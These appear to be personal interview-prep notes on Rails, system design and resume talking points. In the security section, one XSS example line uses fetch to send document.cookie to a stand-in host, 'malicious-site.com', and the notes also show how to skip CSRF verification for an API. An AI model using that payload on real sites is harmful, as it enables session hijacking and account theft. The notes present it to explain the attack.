# Migration to create the join table
class CreateAuthorsBooksJoinTable < ActiveRecord::Migration[6.1]
  def change
    create_join_table :authors, :books do |t|
      t.index :author_id
      t.index :book_id
    end
  end
end

schema of join_table -
CREATE TABLE authors_books (
  author_id INTEGER NOT NULL,
  book_id INTEGER NOT NULL,
  PRIMARY KEY (author_id, book_id),
  FOREIGN KEY (author_id) REFERENCES authors(id),
  FOREIGN KEY (book_id) REFERENCES books(id)
);


Q. Polymorphic Association

With polymorphic associations, a model can belong to more than one other model, on a single association.
Polymorphic means having many forms, so for example in an ecommerce application, There is picture associated with customer profile image, seller profile image, product image, review image etc.

class Picture < ApplicationRecord
  belongs_to :imageable, polymorphic: true
end

class Employee < ApplicationRecord
  has_many :pictures, as: :imageable
end

class Product < ApplicationRecord
  has_many :pictures, as: :imageable
end

Migration - 
class CreatePictures < ActiveRecord::Migration[6.0]
  def change
    create_table :pictures do |t|
      t.string  :name
      t.bigint  :imageable_id
      t.string  :imageable_type
      t.timestamps
    end

    add_index :pictures, [:imageable_type, :imageable_id]
  end
end

class CreatePictures < ActiveRecord::Migration
  def change
    create_table :pictures do |t|
      t.string :name
      t.bigint :imageable_id
      t.string :imageable_type
    end
  end
end

Pictures table now has - foreign_key - imageable_id, and an imageable type

@employee.pictures = 
SELECT p.*
FROM pictures p
JOIN employees e ON e.id = p.imageable_id
WHERE p.imageable_type = 'Employee'


Q. Rack Middleware in rails 

- Rack is a minimal, modular, and adaptable interface for developing web applications in Ruby. It provides a common API for connecting web servers and web frameworks.
For example with Rack I can have separate stages of the pipeline doing:

Authentication: when the request arrives, are the users logon details correct? How do I validate this OAuth, HTTP Basic Authentication, name/password?

Authorisation: is the user authorised to perform this particular task?, i.e. role-based security.

Caching: have I processed this request already, can I return a cached result?

Decoration: how can I enhance the request to make downstream processing better?

Performance & Usage Monitoring: what stats can I get from the request and response?

Execution: actually handle the request and provide a response.


- Middleware in Rack
Middleware is a component that sits between the web server and the web application. 
- Each middleware component can handle various aspects of the request/response lifecycle, such as logging, authentication, session management, and more.
- In Rails, middleware components are used extensively to manage the request/response cycle. When an HTTP request is received, it passes through a series of middleware components before reaching the Rails application. Similarly, the response generated by the Rails application passes back through the middleware stack before being sent to the client.

Creating Custom Middleware
class SimpleLogger
  def initialize(app)
    @app = app
  end

  def call(env)
    start_time = Time.now
    status, headers, response = @app.call(env)
    end_time = Time.now
    puts "Request took #{end_time - start_time} seconds"
    [status, headers, response]
  end
end

Using the middleware
# config/application.rb

module YourApp
  class Application < Rails::Application
    # Add custom middleware to the middleware stack
    config.middleware.use SimpleLogger
  end
end

Common Middleware in rails -
Rack::Runtime: Sets an X-Runtime header, indicating the time taken to process the request.
ActionDispatch::ShowExceptions: Rescues exceptions and displays error pages.
ActionDispatch::Static: Serves static files from the public directory.
Rack::Session::Cookie: Manages session data stored in cookies.
Rack::MethodOverride: Allows HTTP method overriding using a special _method parameter.

command for checking which middlewares are being used - 
rails middleware


Q. Method Overloading in Ruby

Method overloading is a feature in some programming languages where multiple methods can have the same name but different parameters (i.e., different number or types of arguments). However, Ruby does not support method overloading in the traditional sense.

you can achieve similar functionality using the following techniques:

Default Arguments - 
def greet(name, greeting = "Hello")
  puts "#{greeting}, #{name}!"
end
greet("Alice")      
greet("Bob", "Hi")

Variable-Length Argument Lists (*args) - 
def sum(*numbers)
  numbers.reduce(0) { |sum, number| sum + number }
end
puts sum(1, 2, 3)          # Output: 6
puts sum(1, 2, 3, 4, 5)

Keyword Arguments
def introduce(name:, age:, city: "Unknown")
  puts "Name: #{name}, Age: #{age}, City: #{city}"
end
introduce(name: "Alice", age: 30)                       # Output: Name: Alice, Age: 30, City: Unknown
introduce(name: "Bob", age: 25, city: "New York") 


Q. What is Duck Typing 

In Ruby, duck typing means that if an object implements the methods that you expect, you can use it without worrying about its class. This leads to more flexible and reusable code.
Flexibility: Duck typing allows for more flexible and reusable code. You dont have to enforce strict type checks.
Simplicity: It simplifies code by focusing on what an object can do, rather than what it is.
Polymorphism: Duck typing naturally supports polymorphism, where different types can be used interchangeably if they implement the expected methods.

def read_data(source)
  source.read
end
file = File.open("example.txt")
string_io = StringIO.new("Hello, world!")
puts read_data(file)
puts read_data(string_io)

class Car
  def start 
    "Car is starting"
  end
end

class Bike
  def start
    "bike is starting" 
  end
end

def vehicle_start(source)
  source.start
end

car = Car.new
bike = Bike.new
vehicle_start(car)
vehicle_start(bike)

The read_data method works with any object that has a read method.
Both File and StringIO objects can be passed to read_data because they both implement the read method.


Q. How Duck Typing Achieves Polymorphism

Duck typing in Ruby allows polymorphism by focusing on the methods an object can respond to rather than its class or type
class Circle
  def draw
    puts "Drawing a circle"
  end
end
class Square
  def draw
    puts "Drawing a square"
  end
end
# Method expecting objects with a 'draw' method
def render_shape(shape)
  shape.draw
end
circle = Circle.new
square = Square.new
render_shape(circle)  # Output: Drawing a circle
render_shape(square)  # Output: Drawing a square

The render_shape method expects an object that responds to the draw method.
Both Circle and Square classes implement draw, so they can be used interchangeably with render_shape.
The actual behavior of render_shape depends on the draw method defined in the passed object, demonstrating polymorphism through duck typing.


Q. Common Attacks and How to Secure Rails Applications

1. Session Hijacking 
Many web applications have an authentication system: a user provides a user name and password, the web application checks them and stores the corresponding user id in the session hash. From now on, the session is valid. On every request the application will load the user, identified by the user id in the session, without the need for new authentication. The session ID in the cookie identifies the session.
Hence, the cookie serves as temporary authentication for the web application. Anyone who seizes a cookie from someone else, may use the web application as this user - with possibly severe consequences

// XSS attack example
<script>
  fetch('https://malicious-site.com/steal?cookie=' + document.cookie);
</script>

force use ssl over secure encrypted requests 
config.force_ssl = true

2. Session Storage
Rails uses ActionDispatch::Session::CookieStore as the default session storage.

3. Session Fixation
They generate a valid session id and then pass it along with request the victim will send, the session is fixated with their session_id and they are able to access the user data.

We can also implement a session expiry time to time, One of the ways is putting a created_at column on the session table. And checking those regularly and expiring it so that user has to re-authenticate and the cookies and session hash is updated with the new session_ids.

4. SQL Injections 

Ruby on Rails guards against SQL injection attacks by utilizing parameterized queries. Parameters are passed separately from the SQL statement and ensure that user input is treated as data rather than executable code.

5. CSRF - Cross Site Request Forgery 

Cross-Site Request Forgery (CSRF) is a type of web application vulnerability where an attacker tricks a user into performing unwanted actions on a web application in which theyre authenticated. In other words, a CSRF attack takes advantage of the trust that a web application has in the users browser.
To better understand CSRF, lets use an analogy. Imagine youre at a coffee shop using a public Wi-Fi network. You log in to your banks website to check your account balance. Meanwhile, a hacker is sitting at another table on the same network. They notice that youre logged in to your banks website and decide to take advantage of your authenticated session. They send a request to your banks website, pretending to be you, and instruct the bank to transfer money from your account to theirs. This would be an example of a CSRF attack.

Out of the box, Rails includes a security feature called protect_from_forgery, which is enabled by default in every new Rails application. This feature helps to prevent CSRF attacks by adding a unique token to each form in your application. This token is also stored in the users session. 

Heres an example of how this works in practice: Lets say you have a form in your Rails application that allows users to update their email address. With CSRF protection enabled, the form would look something like this when rendered in the users browser:

<form action="/update_email" method="post">
  <input type="hidden" name="authenticity_token" value="random_token_here">
  <input type="email" name="email">
  <input type="submit" value="Update Email">
</form>

Disabling CSRF protection for an API - 
class ApiController < ApplicationController
  skip_before_action :verify_authenticity_token, only: [:update_email]

  def update_email
    # Your code here
  end
end

Customizing the CSRF Token -
you may want to use your own token generation logic. To do this, you can override the form_authenticity_token method in your ApplicationController
class ApplicationController < ActionController::Base
  protect_from_forgery with: :exception

  private

  def form_authenticity_token
    # Your custom token generation logic here
  end
end


Q. Ruby Encapsulation 

Encapsulation is defined as the wrapping up of data under a single unit. It is the mechanism that binds together code and the data it manipulates. In a different way, encapsulation is a protective shield that prevents the data from being accessed by the code outside this shield.

class Demoencapsulation
        
  def initialize(id, name, addr)  
           
   # Instance Variables       
   @cust_id = id  
   @cust_name = name  
   @cust_addr = addr  
  end
       
   # displaying result  
   def display_details()  
   puts "Customer id: #@cust_id"
   puts "Customer name: #@cust_name"
   puts "Customer address: #@cust_addr"
   end
end

# Create Objects  
cust1 = Demoencapsulation .new("1", "Mike",  
              "Wisdom Apartments, Ludhiya")  
cust2 = Demoencapsulation .new("2", "Jackey",  
                "New Empire road, Khandala")  
    
# Call Methods  
cust1.display_details()  
cust2.display_details() 

Here display_details method can be called with only the Demoencapsulation class instances which means it Demoencapsulation logic is encapsulated and restricted to be accessed to only its instances 


Q. Ruby Abstraction - 

It allows you to hide the internal details and complexities of an object and expose only what is necessary for the operation.
Create classes that represent entities and define methods that perform specific actions.
Using Access Control: Use access control mechanisms like public, protected, and private to control the visibility of methods and variables
Simplifies complex systems by exposing only necessary details and hiding the implementation.


Q. Webhooks vs. APIs

APIs (Application Programming Interfaces) - APIs are sets of rules and protocols that allow one software application to interact with another. They define the methods and data structures that developers can use to interact with a service.
characteristics of apis - 
Request/Response Model: APIs typically follow a request/response model where one application (the client) sends a request to another application (the server), and the server responds.
Client-Driven: The client decides when to make a request. This means that the client must periodically check the server for updates or changes (polling).
APIs can be used to perform a wide range of actions, such as retrieving data, updating records, and deleting resources.

Webhooks - Webhooks are a way for an application to provide other applications with real-time information. Webhooks are triggered by events in one system and send an HTTP POST request to another systems URL with the event data.
Event-Driven: There has to a certain event on the server side to trigger the response to the client.
Server-Driven: The server (source system) initiates the communication by sending data to the client (target system) without the client needing to make a request.
REAL TIME UPDATES: Webhooks provide real-time updates, making them ideal for scenarios where immediate notification of an event is crucial.
One-Way Communication:


Q. Multi threading in rails 

require 'thread'

counter = 0
mutex = Mutex.new

threads = []

10.times do
  threads << Thread.new do
    1000.times do
      mutex.synchronize do
        counter += 1
        sleep(0.001) # Encourages context switch, Prevents monopolising PC, Simulating Real-World Delays
      end
    end
  end
end

threads.each(&:join)
puts "Counter value: #{counter}"

def start_multiple_threads(batch_records)
  offset = 0
  limit = 1000
  threads = []
  while offset < batch_records.size
    threads << Thread.new { batch_records.offset(offset).limit(limit) }
    offset += limit
  end
  threads.each { |thread| thread.join }
end


Q. What is JWT tokens 

JWTs are commonly used for authentication and authorization in web applications. In Rails, JWTs can be used to manage user sessions and ensure secure communication between clients and servers.

A JWT is composed of three parts:
Header: Specifies the algorithm used for signing the token (e.g., HS256).
Payload: Contains the claims, such as user information and expiration time.
Signature: Ensures the token has not been tampered with.

gem 'jwt'


class JsonWebToken
  SECRET_KEY = Rails.application.secrets.secret_key_base

  def self.encode(payload, exp = 24.hours.from_now)
    payload[:exp] = exp.to_i
    JWT.encode(payload, SECRET_KEY)
  end

  def self.decode(token)
    body = JWT.decode(token, SECRET_KEY)[0]
    HashWithIndifferentAccess.new(body)
  rescue JWT::DecodeError => e
    raise e
  end
end

# Creating a JWT token while session creation.
class SessionsController < ApplicationController
  def create
    user = User.find_by(email: params[:email])

    if user&.authenticate(params[:password])
      token = JsonWebToken.encode(user_id: user.id)
      render json: { token: token }, status: :ok
    else
      render json: { error: 'Invalid email or password' }, status: :unauthorized
    end
  end
end

class ApplicationController < ActionController::API
  before_action :authenticate_request

  private

  def authenticate_request
    header = request.headers['Authorization']
    header = header.split(' ').last if header
    decoded = JsonWebToken.decode(header)
    @current_user = User.find(decoded[:user_id])
  rescue ActiveRecord::RecordNotFound, JWT::DecodeError
    render json: { errors: 'Unauthorized' }, status: :unauthorized
  end
end

Q. Rails 4 to Rails 5 

Strong Parameters, rails 5 has made convention to use strong params for all the controllers and enforces it.
before_filter -> before_action
Rails 5 required ruby version upgrade as well ruby 2.2 and higher
Ensure that your application and all its dependencies are compatible with the required Ruby version.

Q. Rails 5 to Rails 6

Rails 6 integrates Webpacker as the default JavaScript compiler.
Rails 6 requires Ruby 2.5.0 or higher


Q. Key Properties of Transactions (ACID)

A database transaction is a sequence of operations performed as a single logical unit of work. 

1. Atomicity
Definition: A transaction is an atomic unit of work; it either completes entirely or does not execute at all. If any part of the transaction fails, the entire transaction is rolled back, and no changes are applied to the database.
Example: In a bank transfer scenario, the transaction of transferring money from one account to another must either debit the amount from one account and credit it to another, or neither operation should occur.

2. Consistency
Definition: Transactions must transition the database from one consistent state to another consistent state. The database must satisfy all defined constraints, rules, and triggers throughout the transaction.
Example: If an account balance must always be greater than zero, a transaction should ensure that this constraint is maintained throughout its execution.

3. Isolation
Definition: Transactions are isolated from each other, meaning the intermediate state of a transaction is not visible to other transactions until it is committed. This prevents transactions from interfering with each other.
Example: If two transactions are simultaneously attempting to update the same record, isolation ensures that each transaction sees a consistent snapshot of the data and does not interfere with the other.

4. Durability
Definition: Once a transaction is committed, its changes are permanent and must persist even in the event of a system crash or failure. The data is saved to durable storage.
Example: After completing a bank transfer, the changes to account balances should persist even if the database server crashes immediately afterward.


Q. How Databse Transactions Work

Start a Transaction: A transaction begins when the first operation (such as an INSERT, UPDATE, or DELETE statement) is executed.
Execute Operations: Various operations are performed as part of the transaction.
Commit the Transaction: If all operations succeed and the transaction can be safely completed, the changes are committed to the database. This makes all changes permanent.
Rollback the Transaction: If an error occurs or the transaction cannot be completed, a rollback is performed. This undoes all changes made during the transaction, returning the database to its previous consistent state.



==========================================

Q. Kubernetes and Docker?

https://aws.amazon.com/compare/the-difference-between-kubernetes-and-docker/

==========================================

SYSTEM DESIGN AND DATA ARCHITECTURE - 

Q. Data Sources - 

1. Structured Data Sources - Structured data sources in data architecture refer to data that is organized in a predefined manner, usually in a tabular format with rows and columns. This data is easily searchable and can be efficiently managed and queried using structured query languages like SQL. 

Relational Databases (OLTP - Online Transactional Processing) ->
Examples: MySQL, PostgreSQL, Oracle, SQL Server
Description: Data is stored in tables with predefined schemas. Each table has columns with specified data types and constraints, such as primary keys and foreign keys, which enforce data integrity and relationships between tables.
Use Cases: Transactional applications, such as e-commerce platforms, banking systems, and inventory management.

Data Warehouses (OLAP - Online Analytical Processing) ->
Examples: Amazon Redshift, Google BigQuery, Snowflake
Description: Designed for analytical processing, data warehouses store structured data optimized for query performance. They use schemas like star and snowflake schemas to organize data for efficient querying and reporting.




Q. Database Sharding In depth - 

- Sharding, derived from the term “shard,” signifies a fraction of a complete entity
- Despite maintaining identical schema and columns, each shard houses different rows, ensuring that the data within each shard remains unique and non-overlapping. 
- it’s like having smaller buckets instead of one big bucket to carry water – each bucket is easier to manage than one large, heavy bucket.
Improved Scalability: Sharding allows you to add more servers to your database, spreading the load and enabling more traffic and faster processing.
Increased Operation Capacity: By distributing your database into multiple shards, you can increase both read and write operation capacity if the tasks are performed within one shard at a time.
Localized Indexes: Indexes are smaller and more efficient on each shard, as they only need to cover a subset of the data, resulting in faster search operations.
Fault Isolation: Sharding can provide fault isolation. If one shard fails, it does not affect the other shards, ensuring that the system remains operational even in the case of partial failures.
Simplified Maintenance: Maintenance tasks, such as backups and upgrades, can be performed on individual shards without affecting the entire database, making these tasks more manageable and less risky.
Easier Data Distribution: Data can be distributed based on specific criteria (e.g., geographic location, customer ID), optimizing access patterns and reducing latency for users accessing data from different regions.
Cost-Effective Scaling: Sharding enables the use of multiple smaller, less expensive servers instead of a single large, costly server, making it a cost-effective way to scale the database.
Resource Optimization: By distributing the data and workload across multiple servers, sharding helps optimize resource usage, reducing the risk of overloading any single server.

Techniques of Scaling Database Sharding-

  1. Vertical Partitioning - 
    Divides a table based on columns.
    Useful for tables with many columns, where some columns are rarely used.
    Improves query performance by reducing I/O and allowing efficient indexing of relevant columns.
    May require joins to retrieve data from multiple partitions.

  2. Horizontal Partitioning-
    Divides a table based on rows.
    Useful for table with many rows, where data can be divided based on some criteria.
    Improves query performance by reducing the number of rows to be scanned for specific queries.
    Joins between partitions are typically not required because they contain disjoint sets of rows.
 
Architecture of Sharding -

  1. Key-Based Sharding/Hash based Sharding:
    It uses a hash function to distribute data across shards. A specific data value, such as a user ID, IP address, ZIP code, or Region, is used as input to the hash function. The output is a Shard ID, which determines where the data will be stored.
    This method helps distribute data evenly across all shards, reducing the risk of data hotspots.
    Choose a Key: Select a key for sharding, such as a user ID or order ID.
    Apply Hash Function: Apply a hash function to the key to generate a hash value.
    Modulo Operation: Use the modulo operation to map the hash value to one of the shards. The number of shards determines the modulo divisor.
    Store/Retrieve Data: Based on the result of the modulo operation, store or retrieve the data in the appropriate shard.

    # A hash function example
    def simple_hash_function(key)
      key.sum % 4
    end

    puts simple_hash_function("1001")  # => 2
    puts simple_hash_function("1002")  # => 3
    puts simple_hash_function("1003")  # => 0
    puts simple_hash_function("1004")  # => 1

  2. Range-Based Sharding:
    This is a technique that divides data into shards based on a specific range of values
    For example, in a product’s database, the products could be sharded based on their price ranges. Products with prices between $0 and $100 could be stored in one shard, while products with prices between $100 and $200 could be stored in another shard.
    Range-based sharding can cause uneven data distribution, leading to “database hotspots” where some shards receive more traffic than others.

  3. Directory Based Sharding:
    This is a database strategy that utilizes a lookup table to dictate data storage locations.
    It assigns each key to a specific shard, using the lookup table that contains fixed data location information. It is adaptable and simplifies the process of adding new shards.
    It uses a central directory for managing data-to-shard mapping, optimizing query performance, and enabling efficient load balancing
    However, it can potentially slow down operations due to lookup table access for each query or write. 
    It can also create a single point of failure, making the entire database inaccessible if the lookup table fails

    # lookup table ->
    User ID Range	      Shard
    1 - 1000	          Shard 1
    1001 - 2000	        Shard 2
    2001 - 3000	        Shard 3

    e.g - Here the location based sharding can be done, as in the lookup table we can store country_code and corresponding shard number.


  Scenario - 

  class ApplicationRecord < ActiveRecord::Base
    primary_abstract_class

    connects_to database: {
      primary: { writing: :primary, reading: :primary_replica }
    }
  end

  class Shard < ApplicationRecord
    has_many :users
    validates :country_code, presence: true

    connects_to shards: {
      usa_shard: { writing: :usa_shard, reading: :usa_shard_replica }
      ind_shard: { writing: :ind_shard, reading: :ind_shard_replica }
      eng_shard: { writing: :eng_shard, reading: :eng_shard_replica }
    }

    def self.get_shard(country_code = "IND")
      case country_code
      when 'IND'
        :ind_shard
      when 'USA'
        :usa_shard
      when 'ENG'
        :eng_shard
      else
        raise 'Invalid Country Code'
      end
    end

  end

  class User < ApplicationRecord
    belongs_to :shard
    # ...
  end

  class UsersController < ApplicationController
    def create 
      required_shard = Shard.get_shard(params[:country_code])
      ApplicationRecord.connected_to(role: :writing, shard: required_shard) do @user = User.new(params[:user])
      if @user.save
        redirect_to @user, notice: 'User Created Successfully'
      else
        render json: { errors: @user.errors }, status: :unprocessable_entity
      end
    end
  end

  Factors to Considered before Sharding:

  Database Size: Sharding is typically used for large databases that have outgrown the capacity of a single server.
  Traffic Patterns: If your database experiences uneven traffic patterns, sharding may be beneficial.
  Growth Projections: If your database is expected to scale significantly in the future, sharding may be a good option.
  Complexity: Sharding adds complexity to your database architecture and requires careful planning and maintenance.
  Cost: Sharding can be expensive, as it requires additional hardware resources and infrastructure to support multiple servers.


Q. What is CI/CD -

  CI/CD stands for Continuous Integration and Continuous Deployment/Delivery.
  Its a set of practices and tools that automate the process of software development, from coding through testing to deployment.

  Continuous Integration (CI)
  - Continuous Integration is the practice of integrating code changes into a shared repository several times a day
  - Each integration is verified by an automated build and automated tests to detect integration errors as quickly as possible.
  - Tools like Jenkins, Travis CI, CircleCI, and GitHub Actions are used to automate the CI process.

  Continuous Delivery (CD)
  - Continuous Delivery extends CI by automating the release process so that new changes to the software can be released to production at any time.
  - Automates the deployment process to staging and testing environments.
  - Release Pipeline: A series of automated steps to prepare a build for release, including testing, packaging, and deploying.
  - Various checks (e.g., performance tests, security scans) are incorporated into the pipeline to ensure only high-quality releases.
  - Deployment to production requires manual approval, ensuring a final check before live deployment.

  Continuous Deployment (CD)
  - Continuous Deployment takes Continuous Delivery a step further by automating the entire release process, including deployment to production, without requiring manual approval.
  - Every change that passes the automated tests is automatically deployed to production.
  - Automated monitoring of the production environment and automated rollback mechanisms in case of failures.
  - Feature Flags: Use of feature flags to control the visibility of new features, allowing for safe deployment and gradual rollout.

  CI/CD Pipeline -
  - A CI/CD pipeline is a sequence of steps that code changes go through to be built, tested, and deployed.
  Commit: Developers commit code changes to the version control repository.
  Build: An automated build process compiles the code and creates artifacts.
  Unit Tests: Automated unit tests are run to validate individual components.
  Integration Tests: Automated integration tests are run to validate interactions between components.
  Staging Deployment: The application is deployed to a staging environment identical to production.
  Acceptance Tests: Automated acceptance tests are run in the staging environment.
  Production Deployment: (For Continuous Deployment) The application is automatically deployed to production, or (For Continuous Delivery) a manual approval step is required before deployment.
  Monitoring and Feedback: Post-deployment monitoring and feedback mechanisms are in place to ensure the application runs smoothly in production.



Q. CAP Theorem(Brewers Theorem) -

  It states that it is impossible for a distributed data store to simultaneously provide more than two out of the following three guarantees:

  - Consistency (C): Every read receives the most recent write or an error. This means that all nodes in a distributed system see the same data at the same time. If you perform a read operation, you will always get the latest data written to the system.
  - Availability (A): Every request (read or write) receives a (non-error) response, but without any guarantee that it contains the most recent write. This means that the system is always operational and responsive.
  - Partition Tolerance (P): The system continues to operate despite arbitrary partitioning due to network failures. This means the system can handle any number of communication breakdowns between nodes and still keep working.

  - According to the CAP theorem, a distributed system can only achieve two out of the three properties at any given time. Here’s a breakdown of the trade-offs:

  CA (Consistency and Availability, without Partition Tolerance):
  Scenario: In the absence of network partitions, the system ensures consistency and availability.
  Example: Traditional relational databases (like SQL databases) on a single server.
  Limitation: This configuration is not practical for distributed systems where network partitions can occur.

  CP (Consistency and Partition Tolerance, without Availability):
  Scenario: The system remains consistent and tolerates partitions, but may not always be available.
  Example: Distributed databases like HBase or MongoDB in certain configurations.
  Limitation: During network partitions, the system may become unavailable to ensure consistency.
  
  AP (Availability and Partition Tolerance, without Consistency):
  Scenario: The system remains available and tolerates partitions, but may not always be consistent.
  Example: NoSQL databases like Cassandra or DynamoDB.
  Limitation: The system may return outdated data during network partitions to ensure availability.

  Trade-offs in Distributed System Design:
  High Consistency Needs: Systems requiring strong consistency (e.g., banking systems) may choose CP, sacrificing availability during network partitions.
  High Availability Needs: Systems requiring high availability (e.g., social media platforms) may choose AP, tolerating eventual consistency to remain always responsive.
  Network Partition Considerations: Given that network partitions can occur, truly distributed systems usually prioritize partition tolerance (P) and then make a trade-off between consistency and availability.


Q. Caching and CDNs for decreasing request response latency on cloud based applications

  Caching -
  - Caching involves storing copies of files or data in temporary storage locations (caches) so that future requests can be served faster without reprocessing or retrieving data from the original source.
  Types of Caching:
    1. Browser Caching: Stores web resources (HTML, CSS, JavaScript, images) in the users browser cache. Reduces load times for returning users by avoiding repeated downloads of the same resources. Achieved through HTTP headers like Cache-Control, Expires, and ETag.
    2. Proxy Caching: Intermediate caches that store copies of responses from the server to be reused for future requests. 
      - Reverse Proxy Caching: Caches content on servers like Nginx or Varnish.
      - Forward Proxy Caching: Caches content on client-side proxies.
    3. Server-Side Caching: Stores data on the server side to reduce processing time for repeated requests. Often done using tools like Redis, Memcached, or built-in features of web frameworks.
    4. Database Caching: Stores frequently accessed database query results in memory to speed up read operations. Redis, Memcached, and database-specific caching mechanisms.


  Content Delivery Networks (CDNs) - 
  - A CDN is a network of distributed servers that cache and deliver content (such as web pages, images, videos, and other resources) from locations closer to the end user.
  - By distributing content across multiple geographic locations, CDNs reduce latency and improve the speed and reliability of content delivery.

  How CDN works - 
  - CDNs replicate content from the origin server and store it on multiple edge servers distributed across various geographic locations.
  - When a user requests content, the CDN directs the request to the nearest edge server that has the cached content.
  - The edge server delivers the content quickly, reducing the distance the data must travel and thus improving load times.
  - CDNs periodically refresh their caches to ensure that content remains up-to-date.


Q. Ajax in JQuery -

  $.ajax({
    url: 'https://api.example.com/data',
    method: 'GET', # or 'POST', 'PUT', 'DELETE', etc.
    dataType: 'json', # Expected data type from the server
    data: { key: 'value' }, # Data to send to the server
    success: function(response) {
        // Handle the success response
    },
    error: function(xhr, status, error) {
        // Handle errors
    },
    complete: function(xhr, status) {
        // This function is always called after success or error
    }
  });

  $.ajax({
    url: 'https://api.example.com/data',
    method: 'GET', # or 'POST', 'PUT', 'DELETE', etc.
    dataType: 'json', # Expected data type from the server
    data: { key: 'value' }, # Data to send to the server
    success: function(response) {
        // Handle the success response
    },
    error: function(xhr, status, error) {
        // Handle errors
    },
    complete: function(xhr, status) {
        // This function is always called after success or error
    }
  });

  
  # The $.get() method is a shorthand for performing HTTP GET requests.
  $.get(url, data, success);
  $.get('https://jsonplaceholder.typicode.com/posts', function(data) {
    console.log('Data retrieved:', data);
  });

  # The $.post() method is a shorthand for performing HTTP POST requests.
  $.post(url, data, success);
  $.post('https://jsonplaceholder.typicode.com/posts', { title: 'foo', body: 'bar', userId: 1 }, function(response) {
    console.log('Data posted:', response);
  });

  # The $.getJSON() method is a shorthand for performing HTTP GET requests where the response is expected to be JSON.
  $.getJSON(url, data, success);
  $.getJSON('https://jsonplaceholder.typicode.com/posts', function(data) {
    console.log('JSON data retrieved:', data);
  });


Q. Five things to keep in mind - 
  1. Avoid detailing early. Lay down a very high level architecture end to end. Do not go in definding details of one component.
  2. Avoid silver bullets. Dont have a set architecture in mind. Theres no single architecture thatll fit everywhere.
  3. K. I. S. S - Keep it simple and stupid. The more details you get into one component, the narrower your view is.  Take a step back and take a look at the entire architecture.
  4. Form your thoughts.  Avoid speaking without thinking the point through.
  5. Be tech aware.


=====================================================

Resume prep -

1. Work on continues development and deployment 
  - So this not in the context of CI/CD pipeline.
  - There was a weekly deployment of the enhancements, bugs and feature deliveries.
  - The product had a lot of big clients and some of them used to have hard and fast deadlines and those needed to deployed when the clients wanted it to be. 
  - So in that cases these features were carried out apart from the normal deployment sprints and were delivered indepently. 
  - There were also used to be production bugs which had to be addressed as soon as possible and fixed and deployed. So that was also a kind of continuos delivery kind of thing.
  - So in these sense it was continues development and deployment.
  
2. MongoDB efficient queries
  - The software was written some 15 years back and was not very well structured actually. It must be due they had to have instant MVP to cater to the clients and all.
  - Since the product was scaling their was need to enhacements and all so first thing to improve performance was to optimise queries.
  - There was Activity model which had subtypes like email, call, sms, whatsapp, followup, etc. 
  - On database level Single Table Inheritance was implemented for this, that meant every query on these subtypes was going into same table and these communication models were very heavily in the business logic of the application.
  - These queries were also not properly indexed and queries were taking a lot of time.
  - Since these indexes were compound indexes we had to query it in the order.
  - So we built a criteria filter for these queries where we checked which type of Activity is this and according build the criteria first and then did the .where() query on Activity.
  
3. Redis caching to optimise frequently accessed data
  - So there was one task I had to carry out. Users had many buckets like - news leads, scheduled followups and sitevisists and more. And the Dashboard for all users accross all clients were fixed.
  - We also had provision where clients can make there custom buckets and check whatever the data they want to check in those.
  - So clients were coming up with requirements where they also wanted to see their custom buckets on the User Dashboards.
  - So this was a cumbersome task as everytime when the user will come at the dashboard the queries will get fired very frequently for fetching the custom buckets data.
  - So I used redis to cache the data of the custom buckets as soon as the user logins we will check which custom buckets the user has enabled for the viewing on the dashboard.

4. Strictly following design practices like SOLID principle
  - 

5. Major Ruby on Rails version upgrades twice
  - Rails 4.2 to Rails 5.2 was heavy task, first we tried to jump to Rails 5.2 directly, we had read the documentation 
  - Strong Parameters and Introduction of Action cable
  - Rails 5.2 to 6.0 was relatively easier than the previous there very less breaking changes
  - We had already upgraded our ruby to 2.7.7 and sidekiq to 6 so did not face a lot major issues.
  - However we wanted to upgrade our sidekiq to 7 and the delay method was removed so we have to rely

6. 


















